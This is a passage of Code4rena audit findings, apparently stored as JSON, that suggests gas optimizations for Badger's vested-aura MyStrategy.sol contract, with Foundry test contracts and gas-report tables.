each iteration except for the first),    2.if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first),    3.if it is a calldata array, this is an extra calldataload operation (3 additional gas for each iteration except for the first)  This extra costs can be avoided by caching the array length (in stack):  When reading the length of an array,  **sload** or **mload** or **calldataload** operation is only called once and subsequently replaced by a cheap **dupN** instruction. Even though mload , calldataload and dupN have the same gas cost, mload and calldataload needs an additional dupN to put the offset in the stack, i.e., an extra 3 gas. which brings this to 6 gas   Here, I suggest storing the array\u2019s length in a variable before the for-loop, and use it instead:   File: MyStrategy.sol [line 300](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L300)  ```         for (uint256 i = 0; i < _claims.length; i++) { ```   File: MyStrategy.sol [line 317](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L317)  ```         for (uint256 i = 0; i < _claims.length; i++) { ```   Something similar to my propasal has been implemented already on [line 153](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L153)  ```     function balanceOfRewards() external view override returns (TokenAmount[] memory rewards) {         IAuraLocker.EarnedData[] memory earnedData = LOCKER.claimableRewards(address(this));         uint256 numRewards = earnedData.length;         rewards = new TokenAmount[](numRewards);         for (uint256 i; i < numRewards; ++i) {             rewards[i] = TokenAmount(earnedData[i].token, earnedData[i].amount);         }     } ```  ### No need to initialize variables with their default values  If a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). If you explicitly initialize it with its default value, you are just wasting gas. It costs more gas to initialize variables to zero than to let the default of zero be applied  File: MyStrategy.sol [line 115-121](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L115-L121)  ```     /// @dev Bulk function for sweepRewardToken     function sweepRewards(address[] calldata tokens) external {         uint256 length = tokens.length;         for(uint i = 0; i < length; i++){             sweepRewardToken(tokens[i]);         }     } ```  Similar thing was done on the following line: File:MyStrategy.sol [line 153-155](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L153-L155)  ```         for (uint256 i; i < numRewards; ++i) {             rewards[i] = TokenAmount(earnedData[i].token, earnedData[i].amount);         } ```  **Other instances to modify** File:MyStrategy.sol [line 317](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L317)  ```         for (uint256 i = 0; i < _claims.length; i++) { ```  ## use shorter revert strings(less than 32 bytes)   You can (and should) attach error reason strings along with require statements to make it easier to understand why a contract call reverted. These strings, however, take space in the deployed bytecode. Every reason string takes at least 32 bytes so make sure your string fits in 32 bytes or it will become more expensive.  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.  Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.   File: MyStrategy.sol [line 184](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L184-L187)  ```         require(             balanceOfPool() == 0 && LOCKER.balanceOf(address(this)) == 0,             \"You have to wait for unlock or have to manually rebalance out of it\"         ); ``` "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-badger-findings/issues/135", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-badger-findings", "body": "# Gas Optimizations  The following sections detail the gas optimizations found throughout the codebase. Each optimization is documented with the setup, an explainer for the optimization, a gas report and line identifiers for each optimization across the codebase. For each section's gas report, the optimizer was turned on and set to 10000 runs. You can replicate any tests/gas reports by heading to [0xKitsune/gas-lab](https://github.com/0xKitsune/gas-lab) and cloning the repo. Then, simply copy/paste the contract examples from any section and run `forge test --gas-report`. You can also easily update the optimizer runs in the `foundry.toml`.  ---   ## Use assembly to write storage values  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public {         c0.updateOwner(0x158B28A1b1CB1BE12C6bD8f5a646a0e3B2024734);         c1.assemblyUpdateOwner(0x158B28A1b1CB1BE12C6bD8f5a646a0e3B2024734);     } }  contract Contract0 {     address owner = 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84;      function updateOwner(address newOwner) public {         owner = newOwner;     } }  contract Contract1 {     address owner = 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84;      function assemblyUpdateOwner(address newOwner) public {         assembly {             sstore(owner.slot, newOwner)         }     } }  ```  ### Gas Report ```js \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract0 contract \u2506                 \u2506      \u2506        \u2506      \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 60623              \u2506 261             \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg  \u2506 median \u2506 max  \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 updateOwner        \u2506 5302            \u2506 5302 \u2506 5302   \u2506 5302 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract1 contract \u2506                 \u2506      \u2506        \u2506      \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 54823              \u2506 232             \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg  \u2506 median \u2506 max  \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 assemblyUpdateOwner\u2506 5236            \u2506 5236 \u2506 5236   \u2506 5236 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f ``` ### Lines - MyStrategy.sol:71  - MyStrategy.sol:88  - MyStrategy.sol:94  - MyStrategy.sol:310  - MyStrategy.sol:312   --- ## Use assembly when getting a contract's balance of ETH.  You can use `selfbalance()` instead of `address(this).balance` when getting your contract's balance of ETH to save gas. Additionally, you can use `balance(address)` instead of `address.balance()` when getting an external contract's balance of ETH.  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();     }      function testGas() public {         c0.addressInternalBalance();         c1.assemblyInternalBalance();         c2.addressExternalBalance(address(this));         c3.assemblyExternalBalance(address(this));     } }  contract Contract0 {     function addressInternalBalance() public returns (uint256) {         return address(this).balance;     } }  contract Contract1 {     function assemblyInternalBalance() public returns (uint256) {         assembly {             let c := selfbalance()             mstore(0x00, c)             return(0x00, 0x20)         }     } }  contract Contract2 {     function addressExternalBalance(address addr) public {         uint256 bal = address(addr).balance;         bal++;     } }  contract Contract3 {     function assemblyExternalBalance(address addr) public {         uint256 bal;         assembly {             bal := balance(addr)         }         bal++;     } } ```  ### Gas Report  ```js \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract0 contract     \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost        \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 23675                  \u2506 147             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name          \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 addressInternalBalance \u2506 148             \u2506 148 \u2506 148    \u2506 148 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract1 contract      \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost         \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 27081                   \u2506 165             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name           \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 assemblyInternalBalance \u2506 133             \u2506 133 \u2506 133    \u2506 133 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract2 contract     \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost        \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 61511                  \u2506 339             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name          \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 addressExternalBalance \u2506 417             \u2506 417 \u2506 417    \u2506 417 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract3 contract      \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost         \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 57105                   \u2506 317             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name           \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 assemblyExternalBalance \u2506 411             \u2506 411 \u2506 411    \u2506 411 \u2506 1       \u2502 